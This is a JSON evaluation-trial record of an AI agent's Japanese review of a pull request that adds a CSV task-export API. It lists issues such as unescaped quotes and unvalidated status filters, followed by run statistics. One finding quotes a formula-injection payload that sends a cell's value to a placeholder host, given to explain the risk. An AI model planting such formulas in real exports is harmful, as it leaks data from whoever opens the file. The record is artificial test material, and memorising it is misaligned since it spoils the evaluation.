@@ -1,0 +1,42 @@
+{
+  "trial": "W22-review-pr-full-c3-2",
+  "scenario": "W22",
+  "config": "review-pr-full",
+  "case": "c3",
+  "rep": 2,
+  "review_md": "# レビュー結果: タスク一覧の CSV ダウンロード API\n\n対象: 未コミットの差分（`src/app/api/tasks/export/route.ts`、`src/lib/export.ts`、`tests/export.test.ts`）。\n結論: **マージ前に直すべき問題が高 2 件・中 3 件あります。** PR の説明にある「不正な `status` は指定なし」「引用符を含むタイトルでも列がずれない」は、どちらも実際には成り立ちません。\n\n`npm test` と `npm run typecheck` は通りますが、上の 2 点を検出できるテストがありません。\n\n## 指摘一覧\n\n### 1. 【高】不正な `?status=` が「指定なし」にならず、見出しだけの CSV が返る\n- **場所**: `src/app/api/tasks/export/route.ts` の `GET`（10〜11 行目）\n- **問題**: `searchParams.get(\"status\") as TaskStatus | null` は型を偽るだけで検証していません。値がそのまま `listTasks` の SQL（`status = :status`）に渡ります。\n  - `GET /api/tasks/export?status=foo` や `?status=done2` → 0 件、見出しだけの `tasks.csv` が HTTP 200 で返る。\n  - `?status=`（空文字）→ `\"\" ?? undefined` は `\"\"` のままなので、同じく 0 件。\n  - `GET /api/tasks?status=foo` は全件を返すので、一覧 API と挙動が食い違う。利用者は入力ミスと「タスクが 0 件」を区別できない。\n  - CLAUDE.md の規約 2（型ガードで検証し、不正値は指定なし）に違反。\n- **直し方**: 一覧 API と同じく型ガードを使う。\n  ```ts\n  const status = new URL(request.url).searchParams.get(\"status\");\n  const csv = toCsv(listTasks({ status: isTaskStatus(status) ? status : undefined }));\n  ```\n  `as` のキャストは削除する。できれば解釈を `src/lib/` の関数に出し（規約 1）、単体テストを付ける。\n\n### 2. 【高】タイトル中の二重引用符がエスケープされず、列がずれる\n- **場所**: `src/lib/export.ts` の `field`（10〜12 行目）\n- **問題**: `` `\"${value}\"` `` は全体を囲むだけで、値の中の `\"` を `\"\"` に重ねていません（RFC 4180）。タイトルは 200 文字以内の任意の文字列を受け付けるので、`A \"B\", C` というタイトルは `\"1\",\"A \"B\", C\",\"未着手\",…` になり、引用符の位置で項目が閉じて 6 列になり、ステータス・担当者・期限が 1 列ずつ右にずれる。引用符が奇数個だと行をまたいで後続の行まで壊れることもある。PR の「列がずれないようにする」を満たさない。\n- **直し方**:\n  ```ts\n  return `\"${String(value).replaceAll('\"', '\"\"')}\"`;\n  ```\n  コメントにも「値中の `\"` は `\"\"` にする」と書く。\n\n### 3. 【中】CSV インジェクション（数式の実行）の対策がない\n- **場所**: `src/lib/export.ts` の `field` / `toCsv`\n- **問題**: 目的が Excel で開くことなのに、タイトル・担当者が `=`、`+`、`-`、`@`、タブ、CR で始まっても無加工で出力される。ログインした任意のユーザーが `=HYPERLINK(\"http://example.invalid/?x=\"&B2,\"クリック\")` のようなタイトルのタスクを作ると、別の人が CSV を開いたときに数式として評価される。\n- **直し方**: 文字列の項目（タイトル・担当者）で、先頭が `= + - @ \\t \\r` なら先頭に `'` を付ける。ID と期限には不要。方針（`'` を付ける）を決めてテストで固定する。\n\n### 4. 【中】エスケープのテストが何も検証していない\n- **場所**: `tests/export.test.ts` の \"escapes quotes and commas in titles\"（15〜18 行目）\n- **問題**: 使っているタイトル `週次 定例の準備` には引用符・カンマ・改行のどれも含まれない。エスケープ処理を丸ごと消しても通るので、指摘 2 を見逃している（規約 5 の趣旨にも反する）。\n- **直し方**: `A \"B\", C` と改行を含むタイトルで、出力が `\"A \"\"B\"\", C\\r\\nD\"` になることを厳密に検証する。改行を含む場合は `split(\"\\r\\n\")` で数えず、簡単な CSV パーサーで往復（出力 → 解析 → 元の値）を確認するのがよい。`=1+1` で始まるタイトルのテストも追加する。\n\n### 5. 【中】`status` の絞り込みとルートにテストがない\n- **場所**: `tests/export.test.ts` 全体、`src/app/api/tasks/export/route.ts`\n- **問題**: `toCsv` に渡す前の絞り込みを通すテストがなく、有効な `status` で絞れること、不正値・空文字で全件になることが未検証（指摘 1 の見逃しの原因）。未ログイン時の 401、`Content-Type`・`Content-Disposition`、先頭の BOM も未検証。\n- **直し方**: `status` の解釈を `src/lib/` に出して `\"done\"`・`\"foo\"`・`\"\"`・`null` を単体テストする。`listTasks({ status: \"todo\" })` から CSV を作って件数とラベルを確認するテストも足す。\n\n### 6. 【低】テストがシードデータに依存している\n- **場所**: `tests/export.test.ts` 8〜13 行目\n- **問題**: 行数 9（7 件 + 見出し + 末尾の空要素）と 1 行目の内容が `seed.ts` に固定されており、シードを変えると無関係なテストが壊れる。`in_progress` の「進行中」ラベルも未検証。\n- **直し方**: 明示的な `Task` の配列を渡す。行数は `tasks.length + 2` のように計算する。\n\n### 7. 【低】細かい点\n- `src/lib/export.ts:4` の BOM が不可視文字のリテラルになっている。編集や整形で消えかねないので `\"﻿\"` と書く。\n- `export.ts` の `toCsv` コメントに、最終行の後にも CRLF が付くことが書かれていない。\n- `Content-Disposition` が常に `tasks.csv` で、絞り込み別のファイルが同名になる（例: `tasks-done.csv`）。\n- `STATUS_LABELS[t.status]` は、DB に想定外のステータスがあると `undefined` が `\"undefined\"` として黙って出力される。想定外なら例外にするほうが安全。\n- `src/lib/export.ts` の `field(value: string | number)` はテンプレートリテラルで何でも文字列にする。`assignee`・`dueDate` が将来 NULL になると `\"null\"` という文字列が黙って出力され、型でも検出できない。NULL は空文字にするか、型を `string | number | null` にして明示的に扱う。\n- `src/app/api/tasks/export/route.ts` の `GET`（13 行目）は `listTasks`・`toCsv` の失敗を処理せず、Next の汎用 500 になる（文脈のログも出ない）。他のルートと同じ方針なので重要度は低いが、`{ error }` の JSON で返すか、ログを残すとよい。\n- `route.ts` 冒頭のコメントに、不正な `status` の扱い（指定なしとして全件を出力する）が書かれていない。指摘 1 を直したら追記する。\n- `tests/export.test.ts` のテスト名が英語で、画面文言以外の規約とは無関係だが、他のテストの書き方と揃っているか確認する。1 件目のテストは `openDb()` がシード済みであることに暗黙に依存している（指摘 6 と同じ原因）。\n\n## 問題なしと判断した点\n- 最初に `requireApiUser()` でログインを確認しており、未ログインは 401 になる（規約 9）。\n- SQL はプレースホルダを使っており、インジェクションの恐れはない（規約 8）。\n- 新しい外部ライブラリの追加・スキーマ変更はなく、見出しは日本語。\n",
+  "review_chars": 4023,
+  "review_committed": true,
+  "transcript": {
+    "cost_usd": 0.8097,
+    "tokens": {
+      "input": 76,
+      "output": 19549,
+      "cache_read": 1174091,
+      "cache_creation": 127608
+    },
+    "turns": 7,
+    "permission_denials": [],
+    "tool_calls": {
+      "Bash": 20,
+      "Agent": 5,
+      "Write": 1,
+      "Edit": 1
+    },
+    "skills_used": [],
+    "subagents": 5,
+    "subagent_types": {
+      "pr-review-toolkit:code-reviewer": 1,
+      "pr-review-toolkit:pr-test-analyzer": 1,
+      "pr-review-toolkit:silent-failure-hunter": 1,
+      "pr-review-toolkit:comment-analyzer": 1,
+      "pr-review-toolkit:type-design-analyzer": 1
+    },
+    "questions": 0,
+    "active_seconds": 51,
+    "answer_key_access": [],
+    "isolation_suspects": [],
+    "final_message": "`REVIEW.md` に、書き漏らしていた指摘を足してコミットしました（dead87a）。コミットしたのは `REVIEW.md` だけで、コードには触れていません。\n\n前回の `REVIEW.md` は、場所・問題・直し方・重要度の形式にはなっていましたが、5 つのエージェントの指摘と突き合わせると、次の 4 点が抜けていました。いずれも新しい指摘ではなく、エージェントが出していたものです。重要度は「低」で、指摘 7 に追記しました。\n\n- `field` が NULL を `\"null\"` という文字列で黙って出力する。\n- `route.ts` に DB エラーの処理もログもない。\n- `route.ts` 冒頭のコメントに、不正な `status` の扱いが書かれていない。\n- テストが `openDb()` のシードに暗黙に依存している。\n\n「テスト名が英語」という指摘は、既存のテストも英語名なので問題になりません。追記した項目の中では、「他のテストと揃っているか確認する」程度の書き方にとどめています。\n\n高 2 件、中 3 件、低 2 件という構成は前回のままです。"
+  },
+  "interventions": 0
+}
